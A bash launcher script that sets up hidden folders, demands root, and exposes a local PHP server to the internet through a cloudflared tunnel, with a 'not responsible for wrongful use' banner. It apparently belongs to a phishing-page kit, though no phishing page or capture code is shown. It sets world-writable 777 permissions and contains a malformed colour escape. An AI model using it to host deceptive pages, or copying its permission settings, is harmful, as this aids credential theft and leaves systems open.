#!/bin/bash

# Function to create directories if they don't exist
create_directory() {
    if [[ ! -d "$1" ]]; then
        mkdir -p "$1"
        chmod -R 777 "$1"
    fi
}

# Create necessary directories
create_directory ".host"
create_directory ".www"
create_directory ".tunnels_log"
create_directory ".pages"

# Clear content of log files
truncate -s 0 ".tunnels_log/.cloudfl.log"

# Terminal Colors
RED='\033[31m'
GREEN='\033[32m'
ORANGE='\033[33m'
BLUE='\033[34m'
MAGENTA='\033[35m'
CYAN='\033[36m'
WHITE='\033[37m'
BLACK='\033[30m'
ORANGEBG='\033[43m'
BLUEBG='\033[44m'
RESETFG='\e033[0m'
RESETBG='\e[0m\n'

# Check OS and install packages
check_os_and_install_packages() {
    if [[ -f ".host/cloudflared" ]]; then
        clear
    else
        clear
        header

        OS_SYSTEM=$(uname -o)

        if [ "$OS_SYSTEM" != "Android" ]; then
            bash packages.sh
            bash tunnels.sh
        else
            ./packages.sh
            ./tunnels.sh
        fi
    fi
}

# Check OS for root
check_root_and_os() {
    OS_SYSTEM=$(uname -o)

    if [ "$OS_SYSTEM" != "Android" ]; then
        if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
            clear
            header
            echo -e "The program cannot run.\nFor run program in GNU/Linux Operating System,\nGive root privileges and try again. \n"
            exit 1
        fi
    fi
}

# Function to kill processes
pid_kill() {
    # Kill all pids for php, ngrok, and cloudflared
    if [[ $(pidof php) ]]; then
        killall php > /dev/null 2>&1
    fi
    if [[ $(pidof cloudflared) ]]; then
        killall cloudflared > /dev/null 2>&1
    fi
}

# Print header
header() {
    printf "${BLUE}"
    cat <<- EOF
${ORANGEBG}${RED}  RANDOM RYAN WILL NOT BE HELD RESPONSIBLE $RESETBG                                                                                 
${WHITE}  █████████  █████  ${RED}██████ ${WHITE}  █████  ██  ██ 
${WHITE}    ██      ██   ██ ${RED}██   ██${WHITE} ██   ██ ██  ██ 
${WHITE}    ███████ ██ █ ██ ${RED}█████  ${WHITE} ██ █ ██ ██████ 
${WHITE}         ██ ██   ██ ${RED}██   ██${WHITE} ██   ██ ██  ██
${WHITE}  █████████ ██ ${GREEN}NO${RED}-${GREEN}IM${RED}-${GREEN}NOT${RED}-${GREEN}ANOTHER${RED}-${GREEN}AI${RED}-${GREEN}BOT${WHITE} ██  
${WHITE}   
${ORANGEBG}${RED}  FOR ANY WRONGFUL USE OF THE PROGRAM!!!!  $RESETBG     
EOF

    printf "${RESETBG}"
}

# Log info
log_info() {
    bold=$(tput bold)
    normal=$(tput sgr0)

    printf "${GREEN}"
    cat <<- EOF

EOF

      echo -e "${bold}Info:${normal} ${GREEN}$1${RESETFG}"
    echo -e "$(date +"%Y-%m-%d %H:%M:%S") - Info: $1" >> ".tunnels_log/.cloudfl.log"
    printf "${RESETFG}"
}

# Log error
log_error() {
    bold=$(tput bold)
    normal=$(tput sgr0)

    printf "${RED}"
    cat <<- EOF

EOF

    echo -e "${bold}Error:${normal} ${RED}$1${RESETFG}"
    echo -e "$(date +"%Y-%m-%d %H:%M:%S") - Error: $1" >> ".tunnels_log/.cloudfl.log"
    printf "${RESETFG}"
}

# Start tunnels
start_tunnels() {
    printf "${CYAN}Starting tunnels...${RESETFG}\n"

    # Run cloudflared with config file
    if [[ -f ".host/cloudflared" ]]; then
        .host/cloudflared tunnel run --config .host/cloudflared.yml > /dev/null 2>&1 &
        log_info "Cloudflared tunnel started."
    else
        log_error "Cloudflared binary not found."
    fi

    sleep 5

    # Check if tunnel is running
    if [[ $(pidof cloudflared) ]]; then
        printf "${GREEN}Tunnels started successfully.${RESETFG}\n"
    else
        printf "${RED}Failed to start tunnels. Please check the logs for more information.${RESETFG}\n"
    fi
}

# Start PHP server
start_php_server() {
    printf "${CYAN}Starting PHP server...${RESETFG}\n"

    # Run PHP server in the background
    php -S 127.0.0.1:8080 -t .www > /dev/null 2>&1 &
    log_info "PHP server started."

    sleep 2

    # Check if PHP server is running
    if [[ $(pidof php) ]]; then
        printf "${GREEN}PHP server started successfully.${RESETFG}\n"
    else
        printf "${RED}Failed to start PHP server. Please check the logs for more information.${RESETFG}\n"
    fi
}

# Main function
main() {
    clear
    header

    check_root_and_os
    check_os_and_install_packages

    pid_kill

    start_tunnels
    start_php_server
}

# Execute the main function
main
